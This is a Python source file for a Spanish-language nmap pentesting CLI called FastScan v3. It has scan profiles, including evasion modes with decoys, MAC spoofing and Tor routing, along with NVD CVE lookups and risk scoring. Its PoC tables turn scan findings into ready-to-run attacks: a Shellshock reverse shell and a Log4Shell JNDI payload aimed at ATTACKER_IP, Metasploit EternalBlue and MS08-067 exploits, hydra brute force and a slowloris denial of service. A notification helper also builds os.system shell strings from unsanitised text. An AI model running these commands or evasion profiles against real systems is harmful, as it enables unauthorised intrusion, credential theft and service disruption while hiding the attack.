#!/usr/bin/env python3
"""
FastScan CLI v3 - Herramienta de Pentesting con Nmap
Features optimizadas: ETA real, perfiles avanzados, ruteo SOCKS, NVD API Lookups estables y Risk Scoring.
"""

import sys
import os
import re
import json
import nmap
import argparse
import time
import threading
import urllib.request
import urllib.error
import socket
import subprocess
from urllib.parse import urlparse, quote
from datetime import datetime
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
from rich.panel import Panel
from rich.prompt import Confirm, Prompt

console = Console()

# ─────────────────────────────────────────────────────────────
#  PERFILES DE ESCANEO
# ─────────────────────────────────────────────────────────────
PERFILES = {
    "fast": {
        "args": "-T4 -F -Pn --open",
        "desc": "Reconocimiento Rápido (Top 100 puertos, T4)",
        "eta_base": 5,
        "eta_por_host": 2,
    },
    "deep": {
        "args": "-sS -sV -sC -O -T4 -Pn --open -p-",
        "desc": "Escaneo Completo (SYN + Versión + Scripts base + OS)",
        "eta_base": 30,
        "eta_por_host": 60,
    },
    "udp": {
        "args": "-sU -sV -T4 -Pn --open --top-ports 200",
        "desc": "Escaneo UDP Top 200 (DNS, SNMP, NFS, TFTP…)",
        "eta_base": 20,
        "eta_por_host": 45,
    },
    "stealth": {
        "args": "-sS -T2 -Pn --open -p- -f --data-length 24 --randomize-hosts",
        "desc": "Escaneo Sigiloso (SYN + fragmentación + T2)",
        "eta_base": 60,
        "eta_por_host": 120,
    },
    "evade": {
        "args": "-sS -T2 -Pn --open -p- -f --mtu 8 --data-length 48 --decoy RND:5 --spoof-mac 0 --randomize-hosts",
        "desc": "Evasión Avanzada (fragmentación + decoys + spoof MAC + T2)",
        "eta_base": 120,
        "eta_por_host": 180,
    },
    "vuln": {
        "args": "-sS -sV -sC -T4 -Pn --open --script=vuln,exploit,auth,default",
        "desc": "Auditoría de Vulnerabilidades (NSE: vuln + auth + exploit)",
        "eta_base": 60,
        "eta_por_host": 90,
    },
    "web": {
        "args": (
            "-sS -sV -T4 -Pn --open -p 80,443,8080,8443,8000,8888,3000,5000 "
            "--script=http-title,http-headers,http-methods,http-auth-finder,"
            "http-shellshock,http-sql-injection,http-csrf,http-dombased-xss,"
            "http-stored-xss,http-phpmyadmin-dir-traversal,http-userdir-enum"
        ),
        "desc": "Auditoría Web (HTTP/S con scripts NSE ofensivos)",
        "eta_base": 20,
        "eta_por_host": 45,
    },
    "smb": {
        "args": (
            "-sS -sV -T4 -Pn --open -p 139,445 "
            "--script=smb-vuln-ms17-010,smb-vuln-ms08-067,smb-vuln-cve-2020-0796,"
            "smb-security-mode,smb2-security-mode,smb-enum-shares,smb-enum-users,"
            "smb-os-discovery,smb-protocols"
        ),
        "desc": "Auditoría SMB (EternalBlue, SMBGhost, shares, users…)",
        "eta_base": 15,
        "eta_por_host": 25,
    },
    "recon": {
        "args": "-sn -T4",
        "desc": "Descubrimiento de Hosts en Red (sin escaneo de puertos)",
        "eta_base": 5,
        "eta_por_host": 1,
    },
}

# ─────────────────────────────────────────────────────────────
#  PoC MAP
# ─────────────────────────────────────────────────────────────
POC_MAP = {
    "http-shellshock":        lambda h, p: f"curl -H 'User-Agent: () {{:;}}; /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' http://{h}:{p}/cgi-bin/test.cgi",
    "http-sql-injection":     lambda h, p: f"sqlmap -u 'http://{h}:{p}/' --batch --level=3 --risk=2",
    "http-csrf":              lambda h, p: f"# Revisar manualmente los formularios en http://{h}:{p}/",
    "http-dombased-xss":      lambda h, p: f"# Payload XSS DOM: <script>alert(document.cookie)</script> en params de http://{h}:{p}/",
    "http-stored-xss":        lambda h, p: f"# Payload stored XSS: <img src=x onerror=alert(1)> en formularios de http://{h}:{p}/",
    "http-method-tamper":     lambda h, p: f"curl -i -X HEAD http://{h}:{p}/admin",
    "http-slowloris-check":   lambda h, p: f"slowhttptest -c 1000 -H -g -o slowloris -i 10 -r 200 -t GET -u http://{h}:{p}/",
    "http-auth-finder":       lambda h, p: f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt {h} http-get / -s {p}",
    "smb-vuln-ms17-010":      lambda h, p: f"msfconsole -q -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {h}; set LHOST ATTACKER_IP; run'",
    "smb-vuln-ms08-067":      lambda h, p: f"msfconsole -q -x 'use exploit/windows/smb/ms08_067_netapi; set RHOSTS {h}; set LHOST ATTACKER_IP; run'",
    "smb-vuln-cve-2020-0796": lambda h, p: f"python3 smbghost_poc.py {h}",
    "smb-enum-shares":        lambda h, p: f"smbclient -L //{h}/ -N && crackmapexec smb {h} --shares",
    "ftp-vsftpd-backdoor":    lambda h, p: f"nc -nv {h} 21  # user: anonymous:)  ->  luego: nc -nv {h} 6200",
    "ftp-anon":               lambda h, p: f"ftp {h} {p}  # user: anonymous  pass: (vacía)",
    "ssh-brute":              lambda h, p: f"hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://{h}:{p} -t 4",
    "rdp-vuln-ms12-020":      lambda h, p: f"msfconsole -q -x 'use auxiliary/dos/windows/rdp/ms12_020_maxchannelids; set RHOSTS {h}; run'",
    "ssl-heartbleed":         lambda h, p: f"sslscan {h}:{p} && python3 heartbleed.py {h} -p {p}",
    "ssl-poodle":             lambda h, p: f"sslscan --no-failed {h}:{p}",
    "ms-sql-info":            lambda h, p: f"crackmapexec mssql {h} -u sa -p sa --local-auth",
    "mysql-empty-password":   lambda h, p: f"mysql -h {h} -P {p} -u root",
    "vnc-brute":              lambda h, p: f"hydra -P /usr/share/wordlists/rockyou.txt vnc://{h}:{p}",
}

CVE_POC = {
    "cve-2024-47850": lambda h, p: f"ipptool -v http://{h}:{p}/printers/vulnerable_printer Get-Printer-Attributes",
    "cve-2021-44228": lambda h, p: f"curl -H 'X-Api-Version: ${{jndi:ldap://ATTACKER_IP:1389/a}}' http://{h}:{p}/",
    "cve-2021-26855": lambda h, p: f"python3 proxylogon.py {h}",
}

PUERTOS_WEB = {80, 443, 8080, 8443, 8000, 8888, 3000, 5000, 9090, 9443}

# ─────────────────────────────────────────────────────────────
#  RISK SCORING
# ─────────────────────────────────────────────────────────────
PUERTO_RIESGO = {
    21: 4, 22: 2, 23: 9, 25: 5, 53: 3, 80: 3, 110: 4, 111: 5,
    135: 6, 137: 6, 139: 8, 143: 4, 389: 5, 443: 3, 445: 9,
    512: 8, 513: 8, 514: 8, 1433: 7, 1521: 7, 2049: 6, 3306: 6,
    3389: 8, 4444: 10, 5432: 6, 5900: 7, 6379: 7, 8080: 3,
    8443: 3, 27017: 7,
}

SEVERIDAD_CVSS = {
    "critical": 40,
    "high":     25,
    "medium":   10,
    "low":       3,
}

def calcular_riesgo(puertos_abiertos: list, vulns: list, cves_encontrados: list) -> dict:
    score = 0
    breakdown = []

    for p in puertos_abiertos:
        pts = PUERTO_RIESGO.get(p, 1)
        if pts >= 7:
            score += pts
            breakdown.append(f"Puerto {p} (riesgo: {pts})")

    vuln_pts = len(vulns) * 20
    if vuln_pts:
        score += vuln_pts
        breakdown.append(f"{len(vulns)} vuln(s) NSE confirmada(s) (+{vuln_pts})")

    for cve in cves_encontrados:
        cvss = cve.get("cvss", 0)
        sev  = cve.get("severity", "").lower()
        pts  = SEVERIDAD_CVSS.get(sev, int(cvss * 2))
        score += pts
        breakdown.append(f"{cve['id']} CVSS {cvss} {sev} (+{pts})")

    score = min(score, 100)

    if score >= 70:
        nivel = "[bold red]CRÍTICO[/bold red]"
        nivel_md = "CRÍTICO"
    elif score >= 40:
        nivel = "[bold yellow]ALTO[/bold yellow]"
        nivel_md = "ALTO"
    elif score >= 15:
        nivel = "[bold cyan]MEDIO[/bold cyan]"
        nivel_md = "MEDIO"
    else:
        nivel = "[bold green]BAJO[/bold green]"
        nivel_md = "BAJO"

    return {"score": score, "nivel": nivel, "nivel_md": nivel_md, "breakdown": breakdown}


# ─────────────────────────────────────────────────────────────
#  CVE LOOKUP — NVD API v2
# ─────────────────────────────────────────────────────────────
_cve_cache: dict = {}

def buscar_cves_nvd(producto: str, version: str) -> list:
    if not producto or len(producto) < 3:
        return []

    cache_key = f"{producto.lower()}:{version.lower()}"
    if cache_key in _cve_cache:
        return _cve_cache[cache_key]

    # Delay táctico anti Rate Limit de la NVD
    time.sleep(0.6)
    keyword = quote(f"{producto} {version}".strip())
    url = f"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch={keyword}&resultsPerPage=5"

    try:
        req = urllib.request.Request(url, headers={"User-Agent": "FastScan-CLI/3.0"})
        with urllib.request.urlopen(req, timeout=6) as resp:
            data = json.loads(resp.read().decode())
    except Exception:
        _cve_cache[cache_key] = []
        return []

    resultados = []
    for item in data.get("vulnerabilities", []):
        cve_data = item.get("cve", {})
        cve_id   = cve_data.get("id", "")

        desc = ""
        for d in cve_data.get("descriptions", []):
            if d.get("lang") == "en":
                desc = d.get("value", "")[:120]
                break

        cvss   = 0.0
        sev    = "unknown"
        metrics = cve_data.get("metrics", {})
        for key in ("cvssMetricV31", "cvssMetricV30", "cvssMetricV2"):
            if key in metrics and metrics[key]:
                m = metrics[key][0]
                cvss = m.get("cvssData", {}).get("baseScore", 0.0)
                sev  = m.get("cvssData", {}).get("baseSeverity", "").lower()
                break

        if cvss >= 5.0:
            resultados.append({
                "id":          cve_id,
                "description": desc,
                "cvss":        cvss,
                "severity":    sev,
                "url":         f"https://nvd.nist.gov/vuln/detail/{cve_id}",
            })

    _cve_cache[cache_key] = resultados
    return resultados


# ─────────────────────────────────────────────────────────────
#  ETA ESTIMACIÓN REAL
# ─────────────────────────────────────────────────────────────
def estimar_hosts_activos(target: str) -> int:
    try:
        nm_ping = nmap.PortScanner()
        nm_ping.scan(hosts=target, arguments="-sn -T5 --min-parallelism 50")
        return max(len(nm_ping.all_hosts()), 1)
    except Exception:
        return 1


def calcular_eta(perfil: dict, n_hosts: int) -> int:
    return perfil["eta_base"] + (perfil["eta_por_host"] * n_hosts)


# ─────────────────────────────────────────────────────────────
#  PROXYCHAINS
# ─────────────────────────────────────────────────────────────
def detectar_proxychains() -> bool:
    return subprocess.run(["which", "proxychains4"], capture_output=True).returncode == 0 or \
           subprocess.run(["which", "proxychains"],  capture_output=True).returncode == 0


def get_proxychains_bin() -> str:
    for bin_ in ("proxychains4", "proxychains"):
        if subprocess.run(["which", bin_], capture_output=True).returncode == 0:
            return bin_
    return "proxychains"


# ─────────────────────────────────────────────────────────────
#  HELPERS GENERALES
# ─────────────────────────────────────────────────────────────
def limpiar_target(t: str) -> str:
    t = t.strip()
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}/\d{1,2}$', t):
        return t
    if t.startswith(('http://', 'https://')):
        return urlparse(t).netloc.split(':')[0]
    return t.split('/')[0]


def resolver_hostname(target: str) -> str:
    try:
        return socket.gethostbyname(target)
    except Exception:
        return target


def obtener_titulo_web(target: str, puerto: int) -> str:
    proto = "https" if puerto in (443, 8443) else "http"
    url = f"{proto}://{target}:{puerto}"
    try:
        import ssl
        ctx = ssl._create_unverified_context()
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=4, context=ctx) as r:
            html = r.read(8192).decode("utf-8", errors="ignore")
            m = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
            return m.group(1).strip()[:80] if m else "Sin título"
    except Exception:
        return "No disponible"


def obtener_poc(script_id: str, host: str, puerto: int) -> str:
    sid = script_id.lower()
    for k, fn in CVE_POC.items():
        if k in sid:
            return fn(host, puerto)
    for k, fn in POC_MAP.items():
        if k in sid or sid in k:
            return fn(host, puerto)
    return ""


def check_dependencias():
    if subprocess.run(["which", "nmap"], capture_output=True).returncode != 0:
        console.print("[bold red][!] nmap no está instalado: sudo apt install nmap[/bold red]")
        sys.exit(1)
    if os.geteuid() != 0:
        console.print("[bold yellow][!] Algunos escaneos requieren root (sudo).[/bold yellow]")


def _notificar(mensaje: str, error: bool = False):
    print("\a", end="", flush=True)
    icono = "error" if error else "terminal"
    usuario = os.environ.get("SUDO_USER") or os.environ.get("USER", "")
    dbus    = os.environ.get("DBUS_SESSION_BUS_ADDRESS", "")
    if not dbus and usuario:
        try:
            r = subprocess.run(["su", usuario, "-c", "echo $DBUS_SESSION_BUS_ADDRESS"],
                               capture_output=True, text=True)
            dbus = r.stdout.strip()
        except Exception:
            pass
    cmd = f'DBUS_SESSION_BUS_ADDRESS="{dbus}" notify-send "FastScan CLI" "{mensaje}" -i {icono}'
    if usuario and os.geteuid() == 0:
        os.system(f"su {usuario} -c '{cmd}' 2>/dev/null")
    else:
        os.system(f"{cmd} 2>/dev/null")


# ─────────────────────────────────────────────────────────────
#  EXPORTACIÓN MARKDOWN
# ─────────────────────────────────────────────────────────────
def exportar_markdown(target: str, resultados: list, perfil_desc: str,
                      vulns: list, scores: dict, cves_por_host: dict,
                      nombre_archivo: str = "") -> str:
    fecha = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    default_fname = f"scan_{target.replace('.','_').replace('/','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.md"

    if nombre_archivo:
        nombre_archivo = re.sub(r'[\\/*?:"<>|]', "_", nombre_archivo.strip())
        if not nombre_archivo.endswith(".md"):
            nombre_archivo += ".md"
        fname = nombre_archivo
    else:
        fname = default_fname

    md  = "# FastScan v3 — Reporte de Pentesting\n\n"
    md += f"| Campo | Valor |\n|---|---|\n"
    md += f"| **Objetivo** | `{target}` |\n| **Fecha** | {fecha} |\n| **Perfil** | `{perfil_desc}` |\n\n"

    # Mostrar la tabla de Score SÓLO si hay algún host con puntaje de riesgo > 0
    hosts_con_riesgo = {h: s for h, s in scores.items() if s['score'] > 0}
    if hosts_con_riesgo:
        md += "## 🎯 Risk Score por Host\n\n"
        md += "| Host | Score | Nivel | Factores |\n|---|:---:|:---:|---|\n"
        for host, s in hosts_con_riesgo.items():
            factores = "; ".join(s["breakdown"][:4])
            md += f"| {host} | {s['score']}/100 | {s['nivel_md']} | {factores} |\n"
        md += "\n"

    md += "## Puertos Abiertos\n\n"
    md += "| Host | Puerto | Proto | Servicio | Versión |\n|---|:---:|:---:|---|---|\n"
    for r in resultados:
        det = re.sub(r'\[.*?\]', '', r['detalles']).split('\n')[0].strip()
        md += f"| {r['host']} | {r['puerto']} | {r['protocolo']} | {r['servicio']} | {det} |\n"

    all_cves = [(h, c) for h, clist in cves_por_host.items() for c in clist]
    if all_cves:
        md += "\n## 🔎 CVEs Encontrados (NVD)\n\n"
        md += "| Host | CVE ID | CVSS | Severidad | Descripción |\n|---|---|:---:|:---:|---|\n"
        for host, cve in all_cves:
            md += f"| {host} | [{cve['id']}]({cve['url']}) | {cve['cvss']} | {cve['severity'].upper()} | {cve['description']} |\n"

    if vulns:
        md += "\n## ⚠️ Vulnerabilidades NSE Confirmadas\n\n"
        for v in vulns:
            md += f"### {v['script_id']} — `{v['host']}:{v['puerto']}`\n"
            md += f"```\n{v['output_completo']}\n```\n"
            if v.get('poc'):
                md += f"**🚀 PoC:**\n```bash\n{v['poc']}\n```\n"
            md += "\n---\n"

    with open(fname, "w", encoding="utf-8") as f:
        f.write(md)
    return fname


# ─────────────────────────────────────────────────────────────
#  MOTOR PRINCIPAL
# ─────────────────────────────────────────────────────────────
def ejecutar_escaneo(target_raw: str, perfil_key: str, verbose: bool,
                     exportar: bool = False, usar_proxychains: bool = False):
    check_dependencias()
    target = limpiar_target(target_raw)
    ip_res = resolver_hostname(target)
    perfil = PERFILES[perfil_key]

    proxy_disponible = detectar_proxychains()
    proxy_activo     = False
    if usar_proxychains:
        if proxy_disponible:
            proxy_activo = True
            console.print("[bold cyan][proxy] Proxychains detectado — el escaneo se ruteará por SOCKS/Tor.[/bold cyan]")
        else:
            console.print("[bold yellow][!] proxychains no encontrado. Continuando sin proxy.[/bold yellow]")
    elif proxy_disponible and perfil_key in ("stealth", "evade"):
        usar = Confirm.ask(
            "[bold cyan]?[/bold cyan] Se detectó proxychains. ¿Rutear el escaneo por Tor/SOCKS?",
            default=False
        )
        proxy_activo = usar

    es_rango = "/" in target
    n_hosts  = 1
    if es_rango:
        console.print("[dim]⏱ Estimando hosts activos para calcular ETA...[/dim]")
        n_hosts = estimar_hosts_activos(target)
        console.print(f"[dim]   Hosts detectados en rango: {n_hosts}[/dim]")

    eta_seg = calcular_eta(perfil, n_hosts)
    minutos = eta_seg // 60
    segundos = eta_seg % 60
    eta_str = f"{minutos}m {segundos}s" if minutos else f"{segundos}s"

    console.print(Panel(
        f"[bold white]Objetivo:[/bold white]     [cyan]{target}[/cyan]  [dim]({ip_res})[/dim]\n"
        f"[bold white]Perfil:[/bold white]       [yellow]{perfil['desc']}[/yellow]\n"
        f"[bold white]Argumentos:[/bold white]   [dim]{perfil['args']}[/dim]\n"
        f"[bold white]ETA estimada:[/bold white] [green]{eta_str}[/green]  [dim](basado en {n_hosts} host(s))[/dim]"
        + (f"\n[bold white]Proxy:[/bold white]        [magenta]proxychains activo[/magenta]" if proxy_activo else ""),
        title="[bold blue]⚡ FastScan v3 — Iniciando[/bold blue]",
        border_style="blue"
    ))

    nm = nmap.PortScanner()
    scan_error = [None]

    def lanzar():
        try:
            args_finales = perfil["args"]
            if proxy_activo:
                args_finales = args_finales.replace("-sS", "-sT")
                pc_bin = get_proxychains_bin()
                cmd = f"{pc_bin} nmap {args_finales} {target}"
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                if result.returncode != 0:
                    scan_error[0] = result.stderr[:200]
                else:
                    nm.analyse_nmap_xml_scan(result.stdout)
            else:
                nm.scan(hosts=target, arguments=args_finales)
        except Exception as e:
            scan_error[0] = str(e)

    hilo = threading.Thread(target=lanzar, daemon=True)
    hilo.start()

    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        BarColumn(bar_width=45, style="dim", complete_style="cyan"),
        TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
        transient=True,
    ) as progress:
        task = progress.add_task("Iniciando...", total=100)
        fases = [
            (0,  25, "🔍 Descubriendo hosts activos..."),
            (25, 55, "📡 Escaneando puertos..."),
            (55, 80, "🔬 Detectando versiones y SO..."),
            (80, 97, "📜 Ejecutando scripts NSE..."),
        ]
        inc = 97 / (eta_seg * 10)
        while hilo.is_alive():
            time.sleep(0.1)
            actual = progress.tasks[task].completed
            for start, end, msg in fases:
                if start <= actual < end:
                    progress.update(task, description=msg)
                    break
            if actual < 97:
                progress.advance(task, advance=inc)
        progress.update(task, completed=100, description="✅ Completado")
        hilo.join()

    if scan_error[0]:
        console.print(f"[bold red][!] Error: {scan_error[0]}[/bold red]")
        return

    hosts_activos = nm.all_hosts()
    if not hosts_activos:
        console.print("[bold red]\n[-] Sin hosts activos o el objetivo no respondió.[/bold red]")
        _notificar(f"Sin respuesta: {target}", error=True)
        return

    tabla = Table(title=f"[bold cyan]Resultados: {target}[/bold cyan]",
                  show_lines=True, header_style="bold magenta")
    tabla.add_column("Host",       style="bold white", no_wrap=True)
    tabla.add_column("Puerto",     justify="center", style="bold green")
    tabla.add_column("Proto",      justify="center", style="magenta")
    tabla.add_column("Servicio",   style="cyan")
    tabla.add_column("Versión",    style="white")
    tabla.add_column("Hallazgos",  style="white", overflow="fold")

    lista_resultados  = []
    lista_vulns       = []
    puertos_por_host: dict = {}
    cves_por_host:    dict = {}

    for host in sorted(hosts_activos):
        puertos_por_host.setdefault(host, [])
        cves_por_host.setdefault(host, [])

        for proto in nm[host].all_protocols():
            for port in sorted(nm[host][proto].keys()):
                pdata = nm[host][proto][port]
                if pdata.get("state", "").lower() != "open":
                    continue

                name      = pdata.get("name", "unknown")
                product   = pdata.get("product", "")
                version   = pdata.get("version", "")
                extrainfo = pdata.get("extrainfo", "")
                ostype    = pdata.get("ostype", "")
                version_str = " ".join(filter(None, [product, version, extrainfo,
                                                      f"({ostype})" if ostype else ""])).strip() or "—"

                puertos_por_host[host].append(port)

                cves_nuevos = []
                if product and perfil_key in ("vuln", "web", "smb"):
                    cves_nuevos = buscar_cves_nvd(product, version)
                    if cves_nuevos:
                        cves_por_host[host].extend(cves_nuevos)

                hallazgos_partes = []

                if port in PUERTOS_WEB or "http" in name:
                    titulo = obtener_titulo_web(host, port)
                    hallazgos_partes.append(f"[dim]Title:[/dim] {titulo}")

                if cves_nuevos:
                    for cve in cves_nuevos[:3]:
                        sev_color = {"critical": "bold red", "high": "red",
                                     "medium": "yellow", "low": "green"}.get(cve["severity"], "white")
                        hallazgos_partes.append(
                            f"[{sev_color}]CVE {cve['id']}[/{sev_color}] "
                            f"CVSS {cve['cvss']} — {cve['description'][:60]}…"
                        )

                for script_id, output in pdata.get("script", {}).items():
                    salida = output.strip()
                    if not salida or salida in ("()", "ERROR"):
                        continue
                    lower_out = salida.lower()
                    es_vuln = any(k in lower_out for k in [
                        "state: vulnerable", "vulnerable:", "cve-",
                        "exploitable", "risk factor: high", "risk factor: critical"
                    ])
                    if es_vuln:
                        poc = obtener_poc(script_id, host, port)
                        lista_vulns.append({
                            "host": host, "puerto": str(port),
                            "script_id": script_id,
                            "output_completo": salida,
                            "poc": poc,
                        })
                        if verbose:
                            bloque = "\n  ".join(salida.split("\n"))
                            hallazgos_partes.append(
                                f"[bold red]⚠ VULN ({script_id}):[/bold red]\n  {bloque}"
                                + (f"\n  [bold magenta]🚀 PoC:[/bold magenta] {poc}" if poc else "")
                            )
                        else:
                            primera = [l.strip() for l in salida.split("\n") if l.strip()][0]
                            hallazgos_partes.append(
                                f"[bold red]⚠ VULN:[/bold red] {script_id} — {primera}"
                                + ("\n  [magenta]» PoC disponible (-v o Markdown)[/magenta]" if poc else "")
                            )
                    else:
                        primera = [l.strip() for l in salida.split("\n") if l.strip()]
                        if primera:
                            resumen = f"[dim]{script_id}:[/dim] {primera[0]}"
                            hallazgos_partes.append(resumen[:95])

                hallazgos_str = "\n".join(hallazgos_partes) if hallazgos_partes else "—"
                tabla.add_row(host, str(port), proto.upper(), name, version_str, hallazgos_str)
                lista_resultados.append({
                    "host": host, "puerto": str(port), "protocolo": proto.upper(),
                    "estado": "OPEN", "servicio": name,
                    "detalles": f"{version_str} | {hallazgos_str}",
                })

    scores: dict = {}
    vulns_por_host: dict = {}
    for v in lista_vulns:
        vulns_por_host.setdefault(v["host"], []).append(v)

    for host in hosts_activos:
        scores[host] = calcular_riesgo(
            puertos_por_host.get(host, []),
            vulns_por_host.get(host, []),
            cves_por_host.get(host, []),
        )

    if tabla.rows:
        console.print("\n")
        console.print(tabla)

        # 🎯 Filtrar hosts que realmente tengan un score > 0 para mostrar la tabla de riesgo
        hosts_con_riesgo = {h: s for h, s in scores.items() if s['score'] > 0}
        
        if hosts_con_riesgo:
            score_tabla = Table(title="🎯 Risk Score por Host", header_style="bold magenta", show_lines=True)
            score_tabla.add_column("Host", style="bold white")
            score_tabla.add_column("Score", justify="center")
            score_tabla.add_column("Nivel", justify="center")
            score_tabla.add_column("Factores principales", overflow="fold")
            for host, s in hosts_con_riesgo.items():
                score_tabla.add_row(
                    host,
                    f"{s['score']}/100",
                    s["nivel"],
                    " | ".join(s["breakdown"][:3]) or "—",
                )
            console.print("\n")
            console.print(score_tabla)

        if lista_vulns:
            console.print(f"\n[bold red]🚨 {len(lista_vulns)} vulnerabilidad(es) NSE confirmada(s).[/bold red]")

        total_cves = sum(len(v) for v in cves_por_host.values())
        if total_cves:
            console.print(f"[bold yellow]🔎 {total_cves} CVE(s) encontrado(s) en NVD para los servicios detectados.[/bold yellow]")

        console.print(f"[bold green]\n[+] Escaneo finalizado. {len(lista_resultados)} puerto(s) abierto(s).[/bold green]")
        _notificar(f"Escaneo finalizado: {target} ({len(lista_resultados)} puertos)")

        exportar_ahora = exportar or Confirm.ask(
            "\n[bold cyan]?[/bold cyan] ¿Exportar resultados a Markdown?", default=False
        )
        if exportar_ahora:
            default_name = f"scan_{target.replace('.','_').replace('/','_')}_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
            nombre = Prompt.ask(
                f"[bold cyan]?[/bold cyan] Nombre del archivo [dim](Enter = {default_name}.md)[/dim]",
                default=""
            ).strip()
            archivo = exportar_markdown(target, lista_resultados, perfil["desc"],
                                        lista_vulns, scores, cves_por_host,
                                        nombre_archivo=nombre)
            console.print(f"[bold green][✓] Reporte guardado:[/bold green] [white]{archivo}[/white]")
    else:
        console.print("\n[bold yellow][!] Sin puertos abiertos (cerrados o filtrados).[/bold yellow]")
        _notificar(f"Sin puertos abiertos: {target}", error=True)


# ─────────────────────────────────────────────────────────────
#  MENÚ INTERACTIVO
# ─────────────────────────────────────────────────────────────
MENU_PERFILES = {
    "1": "fast", "2": "deep",  "3": "stealth", "4": "evade",
    "5": "udp",  "6": "web",   "7": "smb",     "8": "vuln", "9": "recon",
}

def mostrar_menu():
    console.print(Panel(
        "\n".join([
            "[bold white]1.[/bold white] [cyan]Reconocimiento Rápido[/cyan]        -T4 -F Top100",
            "[bold white]2.[/bold white] [cyan]Escaneo Completo[/cyan]              -sS -sV -sC -O -p-",
            "[bold white]3.[/bold white] [cyan]Escaneo Sigiloso[/cyan]              -sS -T2 -f --randomize",
            "[bold white]4.[/bold white] [bold red]Evasión Avanzada[/bold red]             -f --mtu 8 --decoy RND:5 --spoof-mac",
            "[bold white]5.[/bold white] [cyan]Escaneo UDP[/cyan]                   -sU Top 200",
            "[bold white]6.[/bold white] [cyan]Auditoría Web[/cyan]                 HTTP/S + NSE ofensivo",
            "[bold white]7.[/bold white] [cyan]Auditoría SMB[/cyan]                 EternalBlue, SMBGhost…",
            "[bold white]8.[/bold white] [cyan]Auditoría de Vulnerabilidades[/cyan] NSE: vuln+exploit+auth",
            "[bold white]9.[/bold white] [cyan]Descubrimiento de Hosts[/cyan]       Ping scan",
        ]),
        title="[bold blue]⚡ FastScan CLI v3 — Menú de Escaneo[/bold blue]",
        border_style="blue"
    ))

    target = Prompt.ask("➔ Objetivo (IP, hostname, URL o rango CIDR)")
    while not target.strip():
        target = Prompt.ask("[!] El objetivo no puede estar vacío")

    opcion    = Prompt.ask("➔ Modo (1-9)", default="2")
    perfil_key = MENU_PERFILES.get(opcion, "deep")
    verbose   = Confirm.ask("➔ ¿Modo verbose (NSE completo)?", default=False)
    ejecutar_escaneo(target, perfil_key, verbose)


# ─────────────────────────────────────────────────────────────
#  ENTRY POINT
# ─────────────────────────────────────────────────────────────
if __name__ == "__main__":
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            description="FastScan CLI v3 — Pentesting con Nmap",
            formatter_class=argparse.RawDescriptionHelpFormatter,
            epilog="""
Ejemplos:
  sudo python3 fastscan.py 192.168.1.0/24 --recon
  sudo python3 fastscan.py 10.0.0.5 --deep -v --export
  sudo python3 fastscan.py 10.0.0.5 --evade --proxychains
  sudo python3 fastscan.py example.com --web --export
  sudo python3 fastscan.py 10.0.0.5 --vuln -v --export
            """
        )
        parser.add_argument("target",        help="IP, dominio, URL o rango CIDR")
        parser.add_argument("-v", "--verbose",    action="store_true", help="Salida completa NSE")
        parser.add_argument("--export",           action="store_true", help="Exportar a Markdown automáticamente")
        parser.add_argument("--proxychains",      action="store_true", help="Rutear el escaneo por proxychains/Tor")

        group = parser.add_mutually_exclusive_group()
        group.add_argument("--fast",    action="store_true")
        group.add_argument("--deep",    action="store_true")
        group.add_argument("--stealth", action="store_true")
        group.add_argument("--evade",   action="store_true", help="Evasión avanzada (decoys, spoof, fragmentación)")
        group.add_argument("--udp",     action="store_true")
        group.add_argument("--web",     action="store_true")
        group.add_argument("--smb",     action="store_true")
        group.add_argument("--vuln",    action="store_true")
        group.add_argument("--recon",   action="store_true")

        args = parser.parse_args()
        perfil = "deep"
        for p in ["fast", "deep", "stealth", "evade", "udp", "web", "smb", "vuln", "recon"]:
            if getattr(args, p, False):
                perfil = p
                break

        ejecutar_escaneo(args.target, perfil, args.verbose, args.export, args.proxychains)
    else:
        mostrar_menu()
